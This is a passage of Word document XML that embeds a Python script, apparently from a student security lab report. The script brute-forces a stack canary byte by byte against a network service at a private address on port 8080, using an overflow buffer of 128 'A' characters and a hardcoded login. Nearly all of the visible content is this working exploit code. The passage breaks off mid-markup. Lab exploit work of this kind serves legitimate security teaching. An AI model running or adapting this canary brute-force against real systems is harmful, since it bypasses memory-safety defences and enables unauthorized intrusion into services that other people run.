          <w:p w14:paraId="68058F06" w14:textId="77777777" w:rsidR="00A04F7E" w:rsidRPr="008E2D33" w:rsidRDefault="00A04F7E" w:rsidP="00A04F7E">
            <w:pPr>
              <w:rPr>
                <w:noProof/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:noProof/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    if badRes in res:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="384CD9AF" w14:textId="77777777" w:rsidR="00A04F7E" w:rsidRPr="008E2D33" w:rsidRDefault="00A04F7E" w:rsidP="00A04F7E">
            <w:pPr>
              <w:rPr>
                <w:noProof/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:noProof/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">        return 0</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7747D5C1" w14:textId="77777777" w:rsidR="00A04F7E" w:rsidRPr="008E2D33" w:rsidRDefault="00A04F7E" w:rsidP="00A04F7E">
            <w:pPr>
              <w:rPr>
                <w:noProof/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:noProof/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    else:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="19E03C62" w14:textId="77777777" w:rsidR="00A04F7E" w:rsidRPr="008E2D33" w:rsidRDefault="00A04F7E" w:rsidP="00A04F7E">
            <w:pPr>
              <w:rPr>
                <w:noProof/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:noProof/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">        return 1</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4A794B66" w14:textId="77777777" w:rsidR="00A04F7E" w:rsidRPr="008E2D33" w:rsidRDefault="00A04F7E" w:rsidP="00A04F7E">
            <w:pPr>
              <w:rPr>
                <w:noProof/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="2A4E730E" w14:textId="77777777" w:rsidR="00A04F7E" w:rsidRPr="008E2D33" w:rsidRDefault="00A04F7E" w:rsidP="00A04F7E">
            <w:pPr>
              <w:rPr>
                <w:noProof/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="1EA0A240" w14:textId="77777777" w:rsidR="00A04F7E" w:rsidRPr="008E2D33" w:rsidRDefault="00A04F7E" w:rsidP="00A04F7E">
            <w:pPr>
              <w:rPr>
                <w:noProof/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:noProof/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>def getCanary(buffer):</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="137D33A4" w14:textId="77777777" w:rsidR="00A04F7E" w:rsidRPr="008E2D33" w:rsidRDefault="00A04F7E" w:rsidP="00A04F7E">
            <w:pPr>
              <w:rPr>
                <w:noProof/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:noProof/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    for element in range(256):</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4532CB82" w14:textId="77777777" w:rsidR="00A04F7E" w:rsidRPr="008E2D33" w:rsidRDefault="00A04F7E" w:rsidP="00A04F7E">
            <w:pPr>
              <w:rPr>
                <w:noProof/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="48B60528" w14:textId="77777777" w:rsidR="00A04F7E" w:rsidRPr="008E2D33" w:rsidRDefault="00A04F7E" w:rsidP="00A04F7E">
            <w:pPr>
              <w:rPr>
                <w:noProof/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:noProof/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">        IP_FH = '10.105.21.174'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="09F09B96" w14:textId="77777777" w:rsidR="00A04F7E" w:rsidRPr="008E2D33" w:rsidRDefault="00A04F7E" w:rsidP="00A04F7E">
            <w:pPr>
              <w:rPr>
                <w:noProof/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:noProof/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">        IP_MARTIN = '10.0.2.22'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6E8D8AFA" w14:textId="77777777" w:rsidR="00A04F7E" w:rsidRPr="008E2D33" w:rsidRDefault="00A04F7E" w:rsidP="00A04F7E">
            <w:pPr>
              <w:rPr>
                <w:noProof/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:noProof/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">        IP = IP_FH</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="47198F95" w14:textId="77777777" w:rsidR="00A04F7E" w:rsidRPr="008E2D33" w:rsidRDefault="00A04F7E" w:rsidP="00A04F7E">
            <w:pPr>
              <w:rPr>
                <w:noProof/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:noProof/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">        PORT = 8080</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3AA61D39" w14:textId="77777777" w:rsidR="00A04F7E" w:rsidRPr="008E2D33" w:rsidRDefault="00A04F7E" w:rsidP="00A04F7E">
            <w:pPr>
              <w:rPr>
                <w:noProof/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:noProof/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">        BUFFE_SIZE = 4096</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="11BBE23C" w14:textId="77777777" w:rsidR="00A04F7E" w:rsidRPr="008E2D33" w:rsidRDefault="00A04F7E" w:rsidP="00A04F7E">
            <w:pPr>
              <w:rPr>
                <w:noProof/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="6FE2D90F" w14:textId="77777777" w:rsidR="00A04F7E" w:rsidRPr="008E2D33" w:rsidRDefault="00A04F7E" w:rsidP="00A04F7E">
            <w:pPr>
              <w:rPr>
                <w:noProof/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:noProof/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">        login = 'cs19m050:cs19m050' + '\n'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6CADF64E" w14:textId="77777777" w:rsidR="00A04F7E" w:rsidRPr="008E2D33" w:rsidRDefault="00A04F7E" w:rsidP="00A04F7E">
            <w:pPr>
              <w:rPr>
                <w:noProof/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:noProof/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">        exit = 'e' + '\n'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="68CEF0DD" w14:textId="77777777" w:rsidR="00A04F7E" w:rsidRPr="008E2D33" w:rsidRDefault="00A04F7E" w:rsidP="00A04F7E">
            <w:pPr>
              <w:rPr>
                <w:noProof/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="65FB4917" w14:textId="77777777" w:rsidR="00A04F7E" w:rsidRPr="008E2D33" w:rsidRDefault="00A04F7E" w:rsidP="00A04F7E">
            <w:pPr>
              <w:rPr>
                <w:noProof/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:noProof/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="742FEC64" w14:textId="77777777" w:rsidR="00A04F7E" w:rsidRPr="008E2D33" w:rsidRDefault="00A04F7E" w:rsidP="00A04F7E">
            <w:pPr>
              <w:rPr>
                <w:noProof/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:noProof/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">        s.settimeout(0.5)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6D8CADE3" w14:textId="77777777" w:rsidR="00A04F7E" w:rsidRPr="008E2D33" w:rsidRDefault="00A04F7E" w:rsidP="00A04F7E">
            <w:pPr>
              <w:rPr>
                <w:noProof/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:noProof/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">        connect = s.connect((IP, PORT))  # hardcoded IP address</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="48F7DD84" w14:textId="77777777" w:rsidR="00A04F7E" w:rsidRPr="008E2D33" w:rsidRDefault="00A04F7E" w:rsidP="00A04F7E">
            <w:pPr>
              <w:rPr>
                <w:noProof/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:noProof/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">        res1 = s.recv(BUFFE_SIZE)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="67F9FB20" w14:textId="77777777" w:rsidR="00A04F7E" w:rsidRPr="008E2D33" w:rsidRDefault="00A04F7E" w:rsidP="00A04F7E">
            <w:pPr>
              <w:rPr>
                <w:noProof/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="7C23E339" w14:textId="77777777" w:rsidR="00A04F7E" w:rsidRPr="008E2D33" w:rsidRDefault="00A04F7E" w:rsidP="00A04F7E">
            <w:pPr>
              <w:rPr>
                <w:noProof/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:noProof/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">        # login with username</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="07D0F16E" w14:textId="77777777" w:rsidR="00A04F7E" w:rsidRPr="008E2D33" w:rsidRDefault="00A04F7E" w:rsidP="00A04F7E">
            <w:pPr>
              <w:rPr>
                <w:noProof/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:noProof/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">        s.send(login)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="75CAB5D7" w14:textId="77777777" w:rsidR="00A04F7E" w:rsidRPr="008E2D33" w:rsidRDefault="00A04F7E" w:rsidP="00A04F7E">
            <w:pPr>
              <w:rPr>
                <w:noProof/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:noProof/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">        res3 = s.recv(BUFFE_SIZE)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7CAEF1BD" w14:textId="77777777" w:rsidR="00A04F7E" w:rsidRPr="008E2D33" w:rsidRDefault="00A04F7E" w:rsidP="00A04F7E">
            <w:pPr>
              <w:rPr>
                <w:noProof/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="5E7CCA95" w14:textId="77777777" w:rsidR="00A04F7E" w:rsidRPr="008E2D33" w:rsidRDefault="00A04F7E" w:rsidP="00A04F7E">
            <w:pPr>
              <w:rPr>
                <w:noProof/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:noProof/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">        s.send(buffer + chr(element) + '\n')</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="747497C2" w14:textId="77777777" w:rsidR="00A04F7E" w:rsidRPr="008E2D33" w:rsidRDefault="00A04F7E" w:rsidP="00A04F7E">
            <w:pPr>
              <w:rPr>
                <w:noProof/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:noProof/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">        res4_1 = s.recv(BUFFE_SIZE)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="37EEE151" w14:textId="77777777" w:rsidR="00A04F7E" w:rsidRPr="008E2D33" w:rsidRDefault="00A04F7E" w:rsidP="00A04F7E">
            <w:pPr>
              <w:rPr>
                <w:noProof/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:noProof/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">        s.send(exit)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6246B35F" w14:textId="77777777" w:rsidR="00A04F7E" w:rsidRPr="008E2D33" w:rsidRDefault="00A04F7E" w:rsidP="00A04F7E">
            <w:pPr>
              <w:rPr>
                <w:noProof/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:noProof/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">        res5 = s.recv(BUFFE_SIZE)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4D5C2046" w14:textId="77777777" w:rsidR="00A04F7E" w:rsidRPr="008E2D33" w:rsidRDefault="00A04F7E" w:rsidP="00A04F7E">
            <w:pPr>
              <w:rPr>
                <w:noProof/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:noProof/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">        res6 = s.recv(BUFFE_SIZE)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="624EF252" w14:textId="77777777" w:rsidR="00A04F7E" w:rsidRPr="008E2D33" w:rsidRDefault="00A04F7E" w:rsidP="00A04F7E">
            <w:pPr>
              <w:rPr>
                <w:noProof/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:noProof/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">        print(res5)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="09B32C47" w14:textId="77777777" w:rsidR="00A04F7E" w:rsidRPr="008E2D33" w:rsidRDefault="00A04F7E" w:rsidP="00A04F7E">
            <w:pPr>
              <w:rPr>
                <w:noProof/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:noProof/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">        print(res6)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="39B65644" w14:textId="77777777" w:rsidR="00A04F7E" w:rsidRPr="008E2D33" w:rsidRDefault="00A04F7E" w:rsidP="00A04F7E">
            <w:pPr>
              <w:rPr>
                <w:noProof/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:noProof/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">        result = checkResponse(res5 + res6)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="23184A91" w14:textId="77777777" w:rsidR="00A04F7E" w:rsidRPr="008E2D33" w:rsidRDefault="00A04F7E" w:rsidP="00A04F7E">
            <w:pPr>
              <w:rPr>
                <w:noProof/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="75F16AAC" w14:textId="77777777" w:rsidR="00A04F7E" w:rsidRPr="008E2D33" w:rsidRDefault="00A04F7E" w:rsidP="00A04F7E">
            <w:pPr>
              <w:rPr>
                <w:noProof/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:noProof/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">        if result == 1:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="49964C0F" w14:textId="77777777" w:rsidR="00A04F7E" w:rsidRPr="008E2D33" w:rsidRDefault="00A04F7E" w:rsidP="00A04F7E">
            <w:pPr>
              <w:rPr>
                <w:noProof/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:noProof/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">            canary1 = element</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="25F0B3CB" w14:textId="77777777" w:rsidR="00A04F7E" w:rsidRPr="008E2D33" w:rsidRDefault="00A04F7E" w:rsidP="00A04F7E">
            <w:pPr>
              <w:rPr>
                <w:noProof/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:noProof/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">            print('Canary = ' + str(canary1) + ' - ' + hex(canary1))</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1E2E2C25" w14:textId="77777777" w:rsidR="00A04F7E" w:rsidRPr="008E2D33" w:rsidRDefault="00A04F7E" w:rsidP="00A04F7E">
            <w:pPr>
              <w:rPr>
                <w:noProof/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:noProof/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">            return element</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6C604029" w14:textId="77777777" w:rsidR="00A04F7E" w:rsidRPr="008E2D33" w:rsidRDefault="00A04F7E" w:rsidP="00A04F7E">
            <w:pPr>
              <w:rPr>
                <w:noProof/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:noProof/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">            break</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="438A51FD" w14:textId="77777777" w:rsidR="00A04F7E" w:rsidRPr="008E2D33" w:rsidRDefault="00A04F7E" w:rsidP="00A04F7E">
            <w:pPr>
              <w:rPr>
                <w:noProof/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:noProof/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">        else:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2C7842BC" w14:textId="77777777" w:rsidR="00A04F7E" w:rsidRPr="008E2D33" w:rsidRDefault="00A04F7E" w:rsidP="00A04F7E">
            <w:pPr>
              <w:rPr>
                <w:noProof/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:noProof/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">            print('Canary is not ' + str(element) + ' - ' + hex(element))</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1CA4E863" w14:textId="77777777" w:rsidR="00A04F7E" w:rsidRPr="008E2D33" w:rsidRDefault="00A04F7E" w:rsidP="00A04F7E">
            <w:pPr>
              <w:rPr>
                <w:noProof/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="7D73D961" w14:textId="77777777" w:rsidR="00A04F7E" w:rsidRPr="008E2D33" w:rsidRDefault="00A04F7E" w:rsidP="00A04F7E">
            <w:pPr>
              <w:rPr>
                <w:noProof/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:noProof/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">        s.close()</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="60676003" w14:textId="77777777" w:rsidR="00A04F7E" w:rsidRPr="008E2D33" w:rsidRDefault="00A04F7E" w:rsidP="00A04F7E">
            <w:pPr>
              <w:rPr>
                <w:noProof/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="78DB4401" w14:textId="77777777" w:rsidR="00A04F7E" w:rsidRPr="008E2D33" w:rsidRDefault="00A04F7E" w:rsidP="00A04F7E">
            <w:pPr>
              <w:rPr>
                <w:noProof/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="0ECCD04E" w14:textId="77777777" w:rsidR="00A04F7E" w:rsidRPr="008E2D33" w:rsidRDefault="00A04F7E" w:rsidP="00A04F7E">
            <w:pPr>
              <w:rPr>
                <w:noProof/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:noProof/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>def main():</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="625FF037" w14:textId="77777777" w:rsidR="00A04F7E" w:rsidRPr="008E2D33" w:rsidRDefault="00A04F7E" w:rsidP="00A04F7E">
            <w:pPr>
              <w:rPr>
                <w:noProof/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:noProof/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    canary1 = 'a'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="158F4A72" w14:textId="77777777" w:rsidR="00A04F7E" w:rsidRPr="008E2D33" w:rsidRDefault="00A04F7E" w:rsidP="00A04F7E">
            <w:pPr>
              <w:rPr>
                <w:noProof/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:noProof/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    canary2 = 'a'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3527B06F" w14:textId="77777777" w:rsidR="00A04F7E" w:rsidRPr="008E2D33" w:rsidRDefault="00A04F7E" w:rsidP="00A04F7E">
            <w:pPr>
              <w:rPr>
                <w:noProof/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:noProof/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    canary3 = 'a'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4EA874EE" w14:textId="77777777" w:rsidR="00A04F7E" w:rsidRPr="008E2D33" w:rsidRDefault="00A04F7E" w:rsidP="00A04F7E">
            <w:pPr>
              <w:rPr>
                <w:noProof/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:noProof/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    canary4 = 'a'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2F9AA9CD" w14:textId="77777777" w:rsidR="00A04F7E" w:rsidRPr="008E2D33" w:rsidRDefault="00A04F7E" w:rsidP="00A04F7E">
            <w:pPr>
              <w:rPr>
                <w:noProof/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="5B70E10E" w14:textId="77777777" w:rsidR="00A04F7E" w:rsidRPr="008E2D33" w:rsidRDefault="00A04F7E" w:rsidP="00A04F7E">
            <w:pPr>
              <w:rPr>
                <w:noProof/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:noProof/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    #buffer = 'u ' + 'A' * 128 + chr(element) + '\n'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1476D026" w14:textId="77777777" w:rsidR="00A04F7E" w:rsidRPr="008E2D33" w:rsidRDefault="00A04F7E" w:rsidP="00A04F7E">
            <w:pPr>
              <w:rPr>
                <w:noProof/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:noProof/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    buffer = 'u ' + 'A' * 128</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2D1BF129" w14:textId="77777777" w:rsidR="00A04F7E" w:rsidRPr="008E2D33" w:rsidRDefault="00A04F7E" w:rsidP="00A04F7E">
            <w:pPr>
              <w:rPr>
                <w:noProof/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:noProof/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    canary1 = getCanary(buffer)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="23FF83F1" w14:textId="77777777" w:rsidR="00A04F7E" w:rsidRPr="008E2D33" w:rsidRDefault="00A04F7E" w:rsidP="00A04F7E">
            <w:pPr>
              <w:rPr>
                <w:noProof/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:noProof/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    buffer = buffer + chr(canary1)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1C758A6C" w14:textId="77777777" w:rsidR="00A04F7E" w:rsidRPr="008E2D33" w:rsidRDefault="00A04F7E" w:rsidP="00A04F7E">
            <w:pPr>
              <w:rPr>
                <w:noProof/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:noProof/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    canary2 = getCanary(buffer)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="644C0ADA" w14:textId="77777777" w:rsidR="00A04F7E" w:rsidRPr="008E2D33" w:rsidRDefault="00A04F7E" w:rsidP="00A04F7E">
            <w:pPr>
              <w:rPr>
                <w:noProof/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:noProof/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    buffer = buffer + chr(canary2)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5449412F" w14:textId="77777777" w:rsidR="00A04F7E" w:rsidRPr="008E2D33" w:rsidRDefault="00A04F7E" w:rsidP="00A04F7E">
            <w:pPr>
              <w:rPr>
                <w:noProof/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:noProof/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    canary3 = getCanary(buffer)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="195688CF" w14:textId="77777777" w:rsidR="00A04F7E" w:rsidRPr="008E2D33" w:rsidRDefault="00A04F7E" w:rsidP="00A04F7E">
            <w:pPr>
              <w:rPr>
                <w:noProof/>
